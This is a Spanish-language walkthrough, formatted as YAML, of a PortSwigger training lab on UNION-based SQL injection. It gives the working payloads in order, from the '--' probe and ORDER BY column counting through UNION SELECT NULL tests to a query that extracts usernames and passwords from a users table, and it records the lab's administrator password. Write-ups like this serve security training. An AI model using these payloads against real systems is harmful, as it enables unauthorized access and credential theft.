---
title: "Ataque UNION de inyección SQL, recuperando datos de otras tablas"
platform: "PortSwigger"
os: "Linux"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "ataque-union-de-inyeccion-sql-recuperando-datos-de-otras-tablas"
author: "Z4k7"
date: "2026-03-01"
year: "2026"
status: "pwned"
tags:
  - "sqli"
  - "web"
  - "union"
  - "practitioner"
techniques:
  - "SQL Injection"
  - "UNION attack"
  - "extracción de credenciales"
  - "ORDER BY"
  - "UNION SELECT"
tools:
  - "BurpSuite"
flags_list:
  - label: "usuario"
    value: "administrator"
  - label: "password"
    value: "qxfd03y8843qcubux672"
summary: "La vulnerabilidad de SQL Injection UNION-based en el filtro de categorías permite extraer información sensible de otras tablas. Este lab integra toda la cadena UNION: detección → conteo de columnas → identificar columnas string → extraer credenciales de la tabla users. Resultado: credenciales del usuario administrator obtenidas y acceso confirmado.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Prueba inicial con `'--` confirma la inyección:
      - kind: "code"
        lang: "SQL"
        code: |
          '--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311142644931.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El comentario SQL interrumpe la consulta, confirmando que la entrada es interpretada directamente por el motor SQL."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "La confirmación de SQLi en reconocimiento es el primer paso irremplazable. Sin esto, cualquier payload posterior podría fallar por razones equivocadas y perderías tiempo buscando el problema en el payload en lugar del vector."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Enumeración de columnas con `ORDER BY`:
      - kind: "code"
        lang: "SQL"
        code: |
          '+ORDER+BY+1,2--   → Éxito
          '+ORDER+BY+1,2,3-- → Error
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311142730399.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El fallo confirma que la consulta devuelve 2 columnas."
      - kind: "note"
        text: |
          Validación con UNION SELECT NULL:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT NULL--         → Error
          ' UNION SELECT NULL,NULL--    → Éxito ✓
          ' UNION SELECT NULL,NULL,NULL-- → Error
      - kind: "image"
        src: "assets/images/Ataque%20UNION%20de%20inyecci%C3%B3n%20SQL,%20recuperando%20datos%20de%20otras%20tablas/file-20260311151057271.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El ataque UNION requiere exactamente 2 columnas para funcionar."
      - kind: "note"
        text: |
          Identificación de columnas compatibles con strings:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT 'a',NULL-- → Éxito ✓
          ' UNION SELECT NULL,'a'-- → Éxito ✓
          ' UNION SELECT 'a','a'--  → Éxito ✓
      - kind: "image"
        src: "assets/images/Ataque%20UNION%20de%20inyecci%C3%B3n%20SQL,%20recuperando%20datos%20de%20otras%20tablas/file-20260311151145735.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Ataque%20UNION%20de%20inyecci%C3%B3n%20SQL,%20recuperando%20datos%20de%20otras%20tablas/file-20260311151204930.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "Ambas columnas aceptan datos tipo string, lo que permite extraer credenciales."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Tener ambas columnas como string es el escenario ideal — puedes extraer username en una y password en la otra directamente, sin concatenación. Si solo una columna aceptara strings necesitarías usar `||'~'||` para combinar ambos valores en una sola columna."

  - id: "exploit_1"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Con 2 columnas string confirmadas y conociendo la tabla `users` con columnas `username` y `password`:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT username, password FROM users--
      - kind: "image"
        src: "assets/images/Ataque%20UNION%20de%20inyecci%C3%B3n%20SQL,%20recuperando%20datos%20de%20otras%20tablas/file-20260311151318199.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "Se obtienen credenciales válidas del usuario `administrator`."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "En un pentest real no conocerías el nombre de la tabla ni las columnas de antemano — usarías `information_schema.tables` y `information_schema.columns` para descubrirlos. Este lab te los dio directamente. Los labs de 'listado de contenido' cubren ese paso previo."
      - kind: "callout"
        type: "info"
        label: "TIP"
        text: "En exámenes y auditorías: ORDER BY → UNION SELECT → Identificar columnas → Extraer datos sensibles."

  - id: "exploit"
    num: "04"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Credenciales del administrador extraídas via UNION SQLi. Login exitoso como administrator.
      - kind: "image"
        src: "assets/images/Ataque%20UNION%20de%20inyecci%C3%B3n%20SQL,%20recuperando%20datos%20de%20otras%20tablas/file-20260311151544808.jpg"
        caption: "Evidencia técnica"

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "usuario"
        value: "administrator"
      - label: "password"
        value: "qxfd03y8843qcubux672"

  - id: "flag_01_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "note"
        text: |
          ---

  - id: "privesc_1"
    num: "05"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          No aplica — el acceso obtenido ya es el de administrador.

lessons:
  - 'Siempre validar número de columnas antes de intentar extraer datos.'
  - 'Identificar columnas compatibles con strings es clave para obtener resultados visibles.'
  - 'En auditorías reales, este tipo de vulnerabilidad puede comprometer credenciales críticas y dar acceso total al sistema.'
mitigation:
  - 'Implementar prepared statements o parametrización.'
  - 'Restringir mensajes de error detallados.'
  - 'Validar y sanitizar entradas de usuario.'
  - 'Aplicar principio de mínimo privilegio en cuentas de base de datos.'
  - 'Monitorear patrones de consultas anómalas (`UNION`, `ORDER BY`, `--`).'
---
